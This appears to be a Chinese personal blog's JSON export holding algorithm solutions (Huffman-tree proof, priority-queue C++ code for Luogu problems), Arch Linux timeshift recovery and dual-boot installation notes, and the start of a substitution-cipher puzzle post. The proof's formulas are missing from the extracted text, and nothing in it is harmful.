我们要做的其实就是最小化这棵树的点权和.\n考虑每个点对答案的贡献. 容易发现, 叶子结点的深度  (设根节点的深度为  )就是它因合并而被计入答案的次数.\n总费用还可以表示为:  .\n考虑问题的一般化, 也就是要构造一棵树  , 要求最小化:\n为在中的深度\n我们要证明的贪心策略其实就是Huffman Tree的构造策略:\n\n  \n    \n      Huffman Tree 构造步骤\n\n    \n    \n      \n初始化: 将每个数视为一个节点.\n合并最小权重节点: 合并权值最小的  个节点  和  作为它们的父亲, 并将新节点加入待合并节点集合中.\n重复合并: 重复步骤  , 直到待合并节点集合中只剩下  个节点. 这样构造出来的树就是 Huffman Tree.\n\n\n    \n  \n\n\n  \n    \n      Huffman Tree具有最优子结构\n\n    \n    \n      引理 1\n设最优的合并树构成集合 . 那么, 存在  , 满足  中权值最小的  个节点  和  是兄弟节点.\n证明\n只需要证明, 对于  , 若  和  不是兄弟节点, 则必存在一种路径改变方式, 使它们成为兄弟节点后,  不会增大.\n记操作Trans(a, b)表示将b的父亲更改为a的父亲, 使b成为a的兄弟节点.\n显然, 由于Trans(a, b)只改变节点b的位置, 因此只有节点b对  的贡献可能改变.\n设  的深度为  ,  的深度为 ,\n\n若  , Trans(i, j)后  ,  不变, 故  不变.\n若  , Trans(i, j)后  ,  , 故  减小.\n若  , Trans(j, i)后  ,  , 故  减小.\n\n因此, 必然存在  棵最优树  , 使得最小的两个节点是兄弟节点. 引理 1 得证.\n\n引理 2\n引理 1中的  和  必然是深度最深的节点.\n结论过于trivial, 证明略.\n\n最优子结构:\n设上面的  合并  和  后得到  , 也就是移除  和  , 并令它们的父亲  . 则  与  的不同之处在于  和  的深度都减少  , 于是有:\n\n显然有:\n最优最优\n至此, 我们证明了Huffman Tree具有最优子结构.\n\n    \n  \n\n\n  \n    \n      Huffman Tree的最优性\n\n    \n    \n      用归纳法证明\n\n 是trivial的.\n假设  时, Huffman Tree的构造是最优的.\n则  时, 设  和  是  中最小的  个节点, 由引理 1知  和  可为兄弟节点, 由最优子结构性质知 最优最优 .\n\n因此Huffman Tree是最优的策略.\n\n    \n  \n\n只要会priority_queue就肯定会写代码了.\nAC Code:\n#include &lt;queue&gt;#include &lt;cstdio&gt;#include &lt;ctype.h&gt;#define N 10005int n, ans;std::priority_queue&lt;int&gt; q;int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f ? x : -x;}signed main(){    n = read();    for(int i = 1; i &lt;= n; ++i) q.push(-read()); // 取负来实现小根堆.    while(q.size() &gt; 1){        int x = -q.top(); q.pop();        int y = -q.top(); q.pop();        ans += x + y;        q.push(-(x + y));    }    printf(\"%d\\n\", ans);    return 0^(0-0)^0;}\n\n\nK - 钓鱼 洛谷P1717 钓鱼\n\n只需要注意到  个显然的性质.\n\n性质1: 在池塘  钓了  次, 向右走到  钓了  次 , 然后发现此时  的鱼最多了, 于是又回到  钓了一次鱼. 这个过程相当于在  钓了  次, 走到  , 在  钓  次. 也就是说, 我们可以随时”反悔”走回头路, 且反悔不需要付出额外代价.\n\n性质2: 在性质1的基础上, 假设我们最终走到第  个池塘, 那么我们可以随时反悔, 走回 第  到第  间的任意池塘, 而不需要花费额外走路时间. 那么每次都贪心地选择  到  中鱼最多的池塘即可.\n\n\n定义  表示最终走到第  个池塘时, 最多能钓到的鱼数.\n 的求解非常简单. 首先用总时长  减去走路总时间  , 并把  压入大根堆中, 每次选择堆顶来钓鱼, 直到时间耗尽或无鱼可钓为止. \n答案即为  .\nAC Code:\n#include &lt;queue&gt;#include &lt;cstdio&gt;#include &lt;ctype.h&gt;#define N 30int n, h, ans;struct Pond{    int f, d, t;    bool operator &lt; (const Pond&amp; noob) const{        return f &lt; noob.f;    }}a[N];int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f ? x : -x;}int max(int a, int b){return a &gt; b? a : b;}int solve(int end){    int H = h, res = 0;    std::priority_queue&lt;Pond&gt; q;    for(int i = 1; i &lt;= end; ++i) H -= a[i].t, q.push(a[i]);    while(H &gt; 0 and q.top().f &gt; 0){        Pond now = q.top(); q.pop();        res += now.f;        now.f -= now.d;        H--;        q.push(now);    }    return res;}signed main(){    n = read(), h = read() * 12;    for(int i = 1; i &lt;= n; ++i) a[i].f = read();    for(int i = 1; i &lt;= n; ++i) a[i].d = read();    a[1].t = 0;    for(int i = 2; i &lt;= n; ++i) a[i].t = read();    std::priority_queue&lt;Pond&gt; q;    for(int i = 1; i &lt;= n; ++i) ans = max(ans, solve(i));    printf(\"%d\\n\", ans);    return 0^(0-0)^0;}\n\n\nL - 中位数 洛谷P1168 中位数\n\n这题做法非常多, 很多数据结构都能做.\n比较简单的就是充分利用中位数性质的对顶堆. 此外也可以直接当作求区间第  大的板子, 比如树状数组, 权值线段树, 平衡树等等.\n见到的比较取巧的做法是vector + lower_bound, 比较阴间的做法是分块, 这里我提供一个比较罕见的pb_ds库的写法. 当然, tree的本质是红黑树. \n这段代码跑得还是比较快的.\nAC Code:\n#include &lt;cstdio&gt;#include &lt;cctype&gt;#include &lt;cstring&gt;#include &lt;ext/pb_ds/tree_policy.hpp&gt;#include &lt;ext/pb_ds/assoc_container.hpp&gt;#define N 1000005//#define int long longint n;int a[N];__gnu_pbds::tree&lt;\tdouble, // 数据类型    __gnu_pbds::null_type, // 不存储与键值相关的数据    std::less&lt;double&gt;, // 从小到大排序. 当然std::greater&lt;double&gt;也可以    __gnu_pbds::rb_tree_tag, // 使用红黑树    __gnu_pbds::tree_order_statistics_node_update // 支持统计操作. 没有这个就用不了排名查询函数.&gt; t;int read(){\tint x = 0, f = 1; char ch = getchar();\tfor(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');\tfor(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);\treturn f ? x : -x;}signed main(){\tn = read();\tfor(int i = 1; i &lt;= n; ++i){\t\ta[i] = read();        t.insert(a[i] + i * 1e-9); // tree底层接近set而非multiset, 不能插入相同的数.\t\tif(i &amp; 1) printf(\"%d\\n\",(int)*t.find_by_order((1 + i) / 2 - 1)); // 中位数也就是排名为(i+1)/2 - 1的元素. 注意, order是从0开始索引, 所以要减一.\t}\treturn 0^(0-0)^0;}\n\nM - 丑数 Humble Numbers 洛谷P2723 [USACO3.1] 丑数 Humble Numbers\n\n很容易想到这样一个做法: 把生成的数压到小根堆中, 每次都取出堆顶, 和  相乘, 得到  个数, 再把没有出现过的数压入堆中. 重复该过程, 直到取出  次堆顶. 此时堆顶就是答案.\n于是写下了这样的代码:\n#include &lt;queue&gt;#include &lt;cstdio&gt;#include &lt;ctype.h&gt;#include &lt;unordered_map&gt;int k, n, rank;long long p[105];bool v[1000005];std::priority_queue&lt;int&gt; q;std::unordered_map&lt;long long, bool&gt; mp;int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f ? x : -x;}bool valid(long long x){    if(x &gt; 2147483647LL) return 1;    if(x &lt;= 1000000) return v[x];    return mp[x];}void insert(long long x){    if(x &lt;= 1000000) v[x] = 1;    else mp[x] = 1;}signed main(){    k = read(), n = read();    for(int i = 1; i &lt;= k; ++i) p[i] = read(), q.push(-p[i]);    while(1){        ++rank;        int x = q.top(); q.pop();        if(rank == n){            printf(\"%d\\n\", -x);            return 0^(0-0)^0;        }    //    printf(\"%d: %lld\\n\", rank, -x);        for(int i = 1; i &lt;= k; ++i){            if(!valid(-x * p[i])){                insert(-x * p[i]);                q.push(x * p[i]);            }        }    }}\n\n发现, 有一个测试点不是 TLE 就是 MLE.\n非常暴躁, 改变判重策略, 直接利用堆的性质来判重: 生成的每个合法的数都压进堆里, 在取堆顶的时候去重.\n然后这份时间复杂度玄学的代码过了…\nAC Code:\n#include &lt;queue&gt;#include &lt;cstdio&gt;#include &lt;ctype.h&gt;int k, n, rank;long long p[105];std::priority_queue&lt;int&gt; q;int read(){    int x = 0, f = 1; char ch = getchar();    for(; !isdigit(ch); ch = getchar()) f ^= (ch == '-');    for(; isdigit(ch); ch = getchar()) x = (x &lt;&lt; 3) + (x &lt;&lt; 1) + (ch xor 48);    return f ? x : -x;}signed main(){    k = read(), n = read();    for(int i = 1; i &lt;= k; ++i) p[i] = read(), q.push(-p[i]);    while(1){        ++rank;        int x = q.top(); q.pop();        while(q.size() &amp;&amp; q.top() == x) q.pop();        if(rank == n){            printf(\"%d\\n\", -x);            return 0^(0-0)^0;        }    //    printf(\"%d: %lld\\n\", rank, -x);        for(int i = 1; i &lt;= k; ++i){            if(-x * p[i] &gt; 2147483647LL) continue;            q.push(x * p[i]);        }    }}","categories":["算法"],"tags":["栈","队列"]},{"title":"使用timeshift恢复滚挂的Archlinux","url":"/2025/04/07/%E4%BD%BF%E7%94%A8timeshift%E6%81%A2%E5%A4%8D%E6%BB%9A%E6%8C%82%E7%9A%84Archlinux/","content":"前言我的 Surface Pro5 安装了 Archlinux, 在昨天使用 sudo pacman -Syu 后, 变成砖了.\n\n症状: 能进系统, 开机后能进入用户登录界面, 但无法使用 触屏, 蓝牙鼠标, 有线键盘, 按下电源键, 本应息屏, 结果它直接关机了.\n\n给我整傻了.\n一开始以为是下载安装包的时候出了问题 (比如中途睡眠了), 但 pacman -Qk | grep -v &#39; 0 missing files&#39;  发现包好像没有损坏, 非常迷.\n不懂怎么修, 还好之前有用 timeshift 备份过系统, 于是最后决定用 timeshift 恢复系统.\n以下是我摸索出来的恢复步骤:\n恢复 Archlinux首先进入 Surface 的 UEFI, 勾选从 USB 启动 选项. \n然后插上我的装有 Kali Live 的 SD卡 (得用读卡器连接, 不能从SD卡直接启动是真难受), 开机进入 Kali 系统.\n(也可以用 U盘 安装 Arch Live 来启动, 这样的话就不需要后面那么多麻烦的操作了, 网上资料一堆.)\n挂载系统┌──(kali㉿kali)-[~]└─$ lsblk -f...nvme0n1│                                                                                 ├─nvme0n1p1│    vfat   FAT32             BD86-2BBD                                           └─nvme0n1p2     btrfs                    d7866fb2-65b6-4f13-b79b-9af65740c58d   \n\n可知引导分区为 nvme0n1p1, 系统分区为 nvme0n1p2.\n因为引导没坏 (能进系统), 所以只挂载系统分区即可.\n┌──(kali㉿kali)-[~]└─$ sudo mount -t btrfs -o subvol=@ /dev/nvme0n1p2 /mnt# 挂载 Btrfs 子卷 @ (即根目录) 到 /mnt .┌──(kali㉿kali)-[~]└─$ sudo mount -t btrfs -o subvol=@home /dev/nvme0n1p2 /mnt/home --mkdir# 挂载 Btrfs 子卷 @home (即 home 目录) 到 /mnt/home .┌──(kali㉿kali)-[~]└─$ sudo mount -t proc /proc /mnt/proc --mkdir# proc 是虚拟文件系统, 而非磁盘内容, 所以指定为 proc 类型进行挂载.┌──(kali㉿kali)-[~]└─$ sudo mount --rbind /dev /mnt/dev --mkdir# 把 Kali 的 /dev 目录挂载到 /mnt/dev, 供 Archlinux 使用.┌──(kali㉿kali)-[~]└─$ sudo mount --rbind /sys /mnt/sys --mkdir# 同上.┌──(kali㉿kali)-[~]└─$ sudo mount --rbind /run /mnt/run --mkdir# 同上.\n\n挂载完成后, 就可以切换到 Archlinux 的环境进行恢复了.\n\n恢复系统┌──(kali㉿kali)-[~]└─$ sudo chroot /mnt /bin/zsh# 切换到 Archlinux 系统.kali# su &lt;username&gt;# 切换为 Archlinux 上的用户.# 输入密码后, 就能看到 zsh 界面了. 如果没安装zsh, 上面的 chroot 改成 /bin/bash 即可.&gt; sudo timeshift --list[sudo] password for surface:Mounted &#x27;/dev/nvme0n1p2&#x27; at &#x27;/run/timeshift/4661/backup&#x27;btrfs: Quotas are not enabledLive Session detected, backup is disabled.Device : /dev/nvme0n1p2UUID   : d7866fb2-65b6-4f13-b79b-9af65740c58dPath   : /run/timeshift/4661/backupMode   : BTRFSStatus : OK5 snapshots, 85.5 GB freeNum     Name                 Tags  Description                             ------------------------------------------------------------------------------0    &gt;  2025-01-09_20-23-13  O                                             1    &gt;  2025-01-13_20-39-41  O                                             2    &gt;  2025-01-24_23-09-43  O                                             3    &gt;  2025-02-27_13-00-10  O                                             4    &gt;  2025-03-13_11-11-58  O&gt; sudo timeshift --restore --snapshot &quot;2025-03-13_11-11-58&quot; --skip-grub# 引导没坏, 不需要动 Grub, 所以加上 --skip-grub 选项.# 输出一大串, 省略了\n\n完事, 重启即可.\n\n后记恢复好系统, 直接再 sudo pacman -Syu.\n然后系统又挂了… 只好把上面的步骤重复了一遍.\n有空再排查原因.\n","tags":["Arch"]},{"title":"安装 Arch + Win11 双系统过程记录","url":"/2025/04/29/%E5%AE%89%E8%A3%85-Arch-Win11-%E5%8F%8C%E7%B3%BB%E7%BB%9F%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/","content":"参考自:\nhttps://blog.linioi.com/posts/18/\nhttps://zhuanlan.zhihu.com/p/9780381446\n\n  \n    本篇文章仅为过程记录, 并非详细教程, 仅供参考. \n\n  \n\n准备工作环境原来的硬盘爆满了, 所以我另外买了一块 SSD, 分了一块空间给 Windows 堆杂文件, 剩下的空间想拿来装一个双系统.\n软硬件参数如下:\n\n\n\n软&#x2F;硬件\n配置\n\n\n\nOS\nWindows 11\n\n\n引导\nUEFI\n\n\nCPU\ni9-14900HX\n\n\nGPU\nRTX 4070 Laptop\n\n\nRAM\n32GB\n\n\n最终选择了 Arch Linux (如标题所见).\n制作 Arch Live USB 并启动到官网找一个国内的镜像站下载 ISO 文件, 我选择的是清华源\n使用Rufus烧录 ISO 镜像到 USB 中.\n\n我已经预留了一个大的空闲空间, 所以不用再去折腾分区了 (记住这句话), 直接重启电脑, 进入 BIOS, 关掉 Fast Boot 和 Secure Boot, 选择 U 盘为第一启动项, 启动.\n启动之后, Boot Menu 选择第一项 Arch Linux install medium (x86_64, UEFI), 回车之后, 正常应该进入到终端了, 没想到黑屏了.\n第一反应是独显惹的祸, 进入 BIOS, 在高级选项里找到 显示模式, 将其从 dGPU Only 改为 动态, 重启.\n这次就成功进入到终端界面了.\n连接网络并同步时间输入 iwctl 进入 iwd 的控制台, 然后依次键入如下命令:\ndevice list                   # 列出可用无线网卡, 我这里输出的是 wlan0station wlan0 scan            # 扫描附近的无线网络station wlan0 get-networks    # 列出扫描到的网络station wlan0 connect &#123;SSID&#125;  # 连接指定网络, 这里我连的是手机热点exit                          # 退出 iwd 控制台\n\n然后, 输入 ping www.baidu.com 测试是否成功联网.\n联网后, 输入如下命令设置时间为 UTC 并完成 NTP 时间同步:\nhwclock --systohc --utctimedatectl set-ntp true\n\n\n分区分区的时候, 才发现我的 SSD 是 MBR (DOS) 分区表, 但 UEFI 引导 不支持 MBR 硬盘启动 Linux 内核, 所以, 我还得把分区表转为 GPT (GUID) …\n于是, 我切换到 Windows, 启动 DiskGenius, 以为转换可以一把梭, 没想到报错了: GPT 分区表需要更多的扇区…\n于是 xjb 改扇区位置, 然后把盘改损坏了… 花了好长的时间恢复…\n总之, 要 确保安装 Arch 的磁盘是 GPT 分区表.\n在 Arch Live 终端输入 lsblk -f, 确定要安装系统的磁盘, 我这里是 /dev/nvme1n1.\n使用 fdisk /dev/nvme1n1 进行分区. ( fdisk 的使用方式, 随便一搜就有)\n这是我的分区:\n\n\n\n分区\n挂载点\n大小\n类型\n文件系统\n\n\n\nESP\n&#x2F;boot\n512MB\nEFI System\nFAT32\n\n\nRoot\n&#x2F;\n剩余所有\nLinux FS\nbtrfs\n\n\n这是我的子卷:\n\n\n\n子卷名\n挂载点\n作用说明\n\n\n\n@\n/\n系统 (除了 &#x2F;home &#x2F;var 等)\n\n\n@home\n/home\n用户目录 (独立于系统)\n\n\n@root\n/root\nroot目录 (独立于系统)\n\n\n@log\n/var/log\n运行时的缓存和日志无需留存\n\n\n@cache\n/var/cache\n运行时的缓存和日志无需留存\n\n\n@tmp\n/var/tmp\n运行时的缓存和日志无需留存\n\n\n@swap\n/swap\n存放 swap 文件的目录 (用于休眠)\n\n\n@snapshots\n/.snapshots\nSnapper 或 Timeshift 的快照存储目录\n\n\n分区后, 键入以下命令, 格式化与挂载分区:\n# 格式化mkfs.fat -F32 /dev/nvme1n1p2 -n EFI        # ESP, 通常 ESP 都是 p1, 但我 p1 已经分了一个存文件的分区了...mkfs.btrfs archlinux /dev/nvme1n1p3  # Root# 如果失败, 试试这条命令: mkfs.btrfs -f -m single -L archlinux /dev/nvme0n1p2# 挂载mount /dev/nvme1n1p3 /mnt# 创建子卷btrfs subvolume create /mnt/@btrfs subvolume create /mnt/@homebtrfs subvolume create /mnt/@rootbtrfs subvolume create /mnt/@logbtrfs subvolume create /mnt/@cachebtrfs subvolume create /mnt/@tmpbtrfs subvolume create /mnt/@swapbtrfs subvolume create /mnt/@snapshotsumount /mnt# 挂载子卷mount /dev/nvme1n1p3 /mnt -o subvol=@,noatime,compress=zstd:1mount /dev/nvme1n1p3 /mnt/home -o subvol=@home,noatime,compress=zstd:1 --mkdirmount /dev/nvme1n1p3 /mnt/root -o subvol=@root,noatime,compress=zstd:1 --mkdirmount /dev/nvme1n1p3 /mnt/var/log -o subvol=@log,noatime,compress=zstd:1 --mkdirmount /dev/nvme1n1p3 /mnt/var/cache -o subvol=@cache,noatime,compress=zstd:1 --mkdirmount /dev/nvme1n1p3 /mnt/var/tmp -o subvol=@tmp,noatime,compress=zstd:1 --mkdirmount /dev/nvme1n1p3 /mnt/swap -o subvol=@swap --mkdir# 取消缓存和日志的 CoW 和压缩chattr +C /mnt/var/logchattr +C /mnt/var/cachechattr +C /mnt/var/tmp# 挂载 EFI 分区mount /dev/nvme1n1p2 /mnt/boot --mkdir\n\n\n安装在安装各个包之前, 需要先换源.\n这里我本来想使用 reflector 来换源:\nreflector --country China --age 24 --sort rate --protocol https --latest 10 --save /etc/pacman.d/mirrorlist\n\n参数解释 (可使用 reflector --help 查看):\n\n\n\n参数\n作用\n\n\n\n--country China\n指定国家和区域\n\n\n--age 24\n指定最后更新&#x2F;同步时间, 过滤掉某些已经停止维护的镜像地址 (单位: 小时)\n\n\n--sort rate\n指定排序方式, 可选 &#123;age,rate,score,delay&#125;\n\n\n--protocol https\n指定协议, 可选 &#123;http,https&#125;\n\n\n--latest 10\n指定要使用的镜像数量\n\n\n--save /etc/pacman.d/mirrorlist\n覆盖默认源\n\n\n但是, 执行的时候报错了: error: failed to retrieve mirrorstatus data: TimeoutError: The read operation timed out\n那就手搓 mirrorlist.\n编辑 /etc/pacman.d/mirrorlist, 在最顶部添加:\nServer = https://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch\n\n然后, 输入以下命令更新软件源.\npacman -Syy\n\n然后添加 archlinuxcn 源, 具体操作参考这里.\n换源之后, 就可以开始安装系统了.\npacstrap -K /mnt base base-devel linux linux-firmware btrfs-progs nano sudo intel-ucode\n\n然后生成 fstab:\ngenfstab -U /mnt &gt;&gt; /mnt/etc/fstab\n\n配置系统 (1)设置基本系统信息arch-chroot /mnt  # 进入本地系统环境# 时间ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime  # 设置时区hwclock --systohc  # 将硬件时间同步为系统时间# 语言echo &quot;en_US.UTF-8 UTF-8&quot; &gt;&gt; /etc/locale.genecho &quot;zh_CN.UTF-8 UTF-8&quot; &gt;&gt; /etc/locale.gen locale-genecho &quot;LANG=en_US.UTF-8&quot; &gt; /etc/locale.conf# 主机名echo &quot;archlinux&quot; &gt; /etc/hostname# 设置 root 的密码passwd\n\n必备应用pacman -S networkmanager dhcpcd neovim git# neovim 似乎不算必备应用...\n\n网络systemctl enable dhcpcdsystemctl enable NetworkManager\n\nPacman启用颜色和多进程下载.\n编辑 /etc/pacman.conf, 取消 Color 和 ParallelDownloads 的注释.\n...#UseSyslogColor#NoProgressBarCheckSpace#VerbosePkgListsParallelDownloads = 5...\n\nInitramfs编辑 /etc/mkinitcpio.conf, 在 HOOKS 中加入 btrfs.\n保存后, 输入:\nmkinitcpio -P\n\n添加用户# 添加用户useradd -m -G wheel &lt;用户名&gt;passwd &lt;用户名&gt;# 为 wheel 组的用户设置 sudo 权限nano /etc/sudoers # 找到 `# %wheel ALL=(ALL:ALL) ALL` 这一行, 去掉注释# 设置默认终端su &lt;用户名&gt;  # 切换用户\n\n\n安装并配置引导加载器 (systemd-boot)我没有使用 grub, 而是用 systemd-boot, 因为觉得它更简单稳定.\n使用 bootctl 安装 systemd-boot:\nbootctl install\n\n然后, 创建 /boot/loader/loader.conf:\ndefault archtimeout 5editor no\n\nArch Linux 引导获取 root 分区的 UUID:\nblkid /dev/nvme1n1p3  # 改成你的 root 分区\n\n创建 /boot/loader/entries/arch.conf:\ntitle   Arch Linuxlinux   /vmlinuz-linuxinitrd  /intel-ucode.imginitrd  /initramfs-linux.imgoptions root=PARTUUID=&lt;你的root分区PARTUUID&gt; rw rootflags=subvol=@,compress=zstd,nvidia_drm.modeset=1\n\n\n  \n    注意, 上面的 PARTUUID 一定要抄对, 不然无法进入系统. \n\n  \n\nWindows 引导arch-chroot /mnt    # 进入安装的系统环境, 已经进入的话就不需要输入这个\n\n通过 lsblk -f 确定 Windows 系统的 EFI 分区, 我这里是 nvme0n1p1.\nmount /dev/nvme0n1p1 /mnt/win-efi --mkdirls /mnt/win-efi/EFI/Microsoft/Boot  # 如果输出一堆东西, 说明 EFI 分区挂载成功mkdir -p /boot/EFI/Microsoft/Bootcp -r /mnt/win-efi/EFI/Microsoft/Boot/* /boot/EFI/Microsoft/Boot/umount /mnt/win-efi\n\n然后, 创建 /boot/loader/entries/windows.conf:\ntitle   Windows 11efi     /EFI/Microsoft/Boot/bootmgfw.efi\n\n我执行到这里, 发现了 bug, UEFI 菜单有两个 Windows 11 选项… 暂未解决.\n配置系统 (2)重启, 进入安装的 Arch Linux 系统 (把装有 Arch Linux 的硬盘设为第一启动项), 继续配置.\n如果前面一切顺利, 这里应该会进入 tty 终端.\n通过以下命令连接 WiFi:\nnmcli device wifi listnmcli device wifi connect &lt;SSID&gt; password &lt;密码&gt;\n\n显卡参考自 wiki.\nlspci -k | grep -A 2 -E &quot;(VGA|3D)&quot;                  # 查看显卡sudo pacman -S nvidia nvidia-utils nvidia-settings  # 安装显卡驱动sudo nano /etc/mkinitcpio.conf                    # 在 MODULES 中加入 nvidia nvidia_modeset nvidia_uvm nvidia_drm                    # 将 kms 从 HOOKS 中去掉sudo mkinitcpio -Preboot              # 重启nvidia-smi          # 验证是否安装成功\n\n为了避免在 NVIDIA 驱动程序升级后忘记更新 initramfs 的可能性, 可能需要使用 pacman HOOK.\n编辑 /etc/pacman.d/hooks/nvidia.hook, 写入如下内容:\n[Trigger]Operation=InstallOperation=UpgradeOperation=RemoveType=PackageTarget=nvidiaTarget=linux# Change the linux part above and in the Exec line if a different kernel is used# 如果使用不同的内核，请更改上面的 linux 部分和 Exec 行中的内容，例如更改为Target=nvidia-open[Action]Description=Updating Nvidia module in initcpioDepends=mkinitcpioWhen=PostTransactionNeedsTargetsExec=/bin/sh -c &#x27;while read -r trg; do case $trg in linux) exit 0; esac; done; /usr/bin/mkinitcpio -P&#x27;\n\nhyprland\n  \n    本部分参考了官方wiki以及这篇文章. \n\n  \n\nsudo pacman -S hyprland\n\n(注: 我原来安装了 sddm, 但后面发现这玩意又丑又难用, 遂放弃, 选择在 tty 上启动 hyprland)\n创建 ~/.config/hypr 文件夹, 然后把 /usr/share/hypr 复制到 ~/.config/hypr 下.\n编辑 ~/.config/hypr/hyprland.conf, 添加如下变量:\nenv = LIBVA_DRIVER_NAME,nvidiaenv = XDG_SESSION_TYPE,waylandenv = GBM_BACKEND,nvidia-drmenv = __GLX_VENDOR_LIBRARY_NAME,nvidiaenv = WLR_NO_HARDWARE_CURSORS,1\n\n然后 reboot 重启.\n重启后, 在 tty 中输入 hyprland 即可进入桌面. 不过先别急, 等安装 kitty 后再进入 hyprland. 在 hyprland 中, 打开终端的默认快捷键是 [Super] + Q (Super 是 Win 键).\nkittysudo pacman -S kitty\n\n编辑 ~/.config/kitty/kitty.conf (如果路径不存在, 就创建):\nfont_family      CaskaydiaMono Nerd Font Monofont_size        15bold_font        autoitalic_font      auto\n\nzsh我不喜欢 oh-my-zsh, zsh 加几个插件就能满足我的需求.\nsudo pacman -S zsh zsh-autosuggestions zsh-completions zsh-history-substring-search zsh-syntax-highlighting\n\n下载 powerlevel10k 主题:\nmkdir -p /usr/share/zsh/themes/powerlevel10kgit clone --depth=1 https://github.com/romkatv/powerlevel10k.git /usr/share/zsh/themes/powerlevel10k/\n\n编辑 ~/.zshrc, 添加以下内容:\nsource /usr/share/zsh/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zshsource /usr/share/zsh/plugins/zsh-autosuggestions/zsh-autosuggestions.zshsource /usr/share/zsh/plugins/zsh-history-substring-search/zsh-history-substring-search.zshsource /usr/share/zsh/themes/powerlevel10k/powerlevel10k.zsh-theme\n\n然后输入:\nchsh -s /usr/bin/zsh\n\n重启或重新登录, 然后配置 zsh 和 powerlevel10k 即可.\nrofi我使用 rofi 作为我的应用启动器.\n\n  \n    安装配置过程参考了这篇文章. \n\n  \n\n安装:\nsudo pacman -S rofi-wayland\n\n配置主题:\n# 创建配置目录mkdir -p ~/.local/share/rofi/themes/# 下载主题git clone https://github.com/lr-tech/rofi-themes-collection.gitcp rofi-themes-collection/themes /usr/share/rofi/themes/# 选择主题rofi-theme-selector   # 我选择的是 rounded-nord-dark\n\n启用应用图标, 在 ~/.config/rofi/config.rasi 中添加:\nconfiguration &#123;    show-icons: true;&#125;\n\n在 ~/.config/hypr/hyprland.conf 中添加:\n$menu = rofi --show drun\n\n就可以通过 [Super] + R 打开 rofi 了.\n字体sudo pacman -S ttf-cascadia-mono-nerd       sudo pacman -S adobe-source-han-sans-cn-fonts adobe-source-code-pro-fonts\n\n中文输入法我使用 fcitx5, 使用最广泛的中文输入法.\n\n  \n    本部分参考了这篇文章. \n\n  \n\nsudo pacman -S fcitx5-im fcitx5-chinese-addons fcitx5-pinyin-zhwiki\n\n在 /etc/environment 中添加:\nGTK_IM_MODULE=fcitxQT_IM_MODULE=fcitxXMODIFIERS=@im=fcitxSDL_IM_MODULE=fcitx\n\n然后在 ~/.config/hypr/hyprland.conf 中设置自启动:\nexec-once = fcitx5 --replace -d\n\n这个时候还用不了, 需要进一步配置.\n用 rofi 启动 或 在终端输入 fcitx5-configtool, 进入配置界面.\n右半部分窗口, 取消 Only Show Current Language, 然后搜索 pin, 启用这个 Pinyin 选项.\n\n之后, 就可以按 [Ctrl] + [Space] 切换中文输入法了.\n不过, 默认的 UI 实在太丑了, 我另外安装了 fcitx5-material-color 主题.\nsudo pacman -S fcitx5-material-color\n\n然后, 在 fcitx5-configtool 的界面中, Addons → Classic User Interface (Configure) -&gt; Theme 中选择主题, 我选择的是 Material-Color-Blue.\nwaybarsudo pacman -S waybar\n\n在 Hyprland 的配置文件 ~/.config/hypr/hyprland.conf 中添加:\nexec-once = waybar\n\n美化等以后再说.\nswaync通知守护程序.\nsudo pacman -S swaync\n\n然后在 hyprland 配置文件中添加 exec-once = swaync.\n截图与录屏截图使用 grim + slurp, 录屏直接用 obs-studio.\nsudo pacman -S grim slurp obs-studio\n\n然后配置一下截图快捷键 ([Super] + [PrtSc]).\n在 ~/.config/hypr/hyprland.conf 中添加:\n$screenshot = grim -g &quot;$(slurp)&quot;bind = $mainMod , Print, exec, $screenshot\n\nChrome浏览器.\nsudo pacman -S google-chrome-stable\n\n分辨率设置本部分参考了这篇文章\n缩放比例不为 1 时, 如 Chrome，VSCode 等 xwayland 上的软件会出现模糊的情况, 解决方法如下.\n需要先安装 xorg-xrdb.\nsudo pacman -S xorg-xrdb\n\n编辑 ~/.config/hypr/hyprland.conf 文件, 添加:\nxwayland &#123;  force_zero_scaling = true&#125;\n\n上述配置用于禁止 xwayland 缩放.\n添加:\nexec-once = echo &#x27;Xft.dpi:144&#x27; | xrdb -merge\n\n原 dpi 是 96, 144 是 1.5 倍缩放, 具体 dpi 请根据实际情况调整.\n启用 swap\n  \n    本部分参考了这篇文章. \n\n  \n\ncd /swapsudo truncate -s 0 swapfilesudo chattr +C swapfilesudo chmod 600 swapfilesudo dd if=/dev/zero of=/swap/swapfile bs=1M count=20480  # 20Gsudo mkswap swapfilesudo swapon swapfilesudo echo &quot;/swap/swapfile none swap defaults,nofail,x-systemd.device-timeout=10s 0 0&quot; | sudo tee -a /etc/fstab\n\n暂时先写这么多吧.\n","tags":["Arch"]},{"title":"一道简单的单表代换加密","url":"/2024/12/19/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95%E7%9A%84%E5%8D%95%E8%A1%A8%E4%BB%A3%E6%8D%A2%E5%8A%A0%E5%AF%86/","content":"题目描述已知明文节选自《聊斋志异》, 转为拼音后进行单表加密, 现要根据密文进行解密. 